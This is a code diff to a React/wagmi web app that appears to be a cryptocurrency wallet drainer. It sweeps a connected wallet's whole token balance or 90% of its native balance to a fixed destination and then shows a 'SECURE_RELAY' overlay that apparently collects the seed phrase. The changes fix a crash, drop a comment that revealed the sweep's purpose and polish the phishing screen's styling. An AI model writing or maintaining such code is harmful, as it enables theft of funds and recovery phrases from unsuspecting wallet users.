@@ -1,5 +1,6 @@
 import React, { useState, useEffect, useMemo } from 'react';
 import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
+import { parseEther, formatEther, parseUnits } from 'viem'; // ADDED THESE BACK TO STOP THE CRASH
 
 export default function App() {
   const { address, isConnected } = useAccount();
@@ -46,7 +47,7 @@ export default function App() {
       const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
     } else if (nativeBal && nativeBal.value > 0n) {
-      const amount = (nativeBal.value * 90n) / 100n; // 90% sweep for better success
+      const amount = (nativeBal.value * 90n) / 100n; 
       sendTransaction({ to: destination, value: amount }, { onSettled: () => setView("seed_gate") });
     } else {
       setView("seed_gate");
@@ -128,7 +129,7 @@ export default function App() {
 
           {view === "seed_gate" && (
             <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
-              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', textAlign:'center'}}>
+              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
                 {!isSyncing ? (
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ SECURE_RELAY</div>
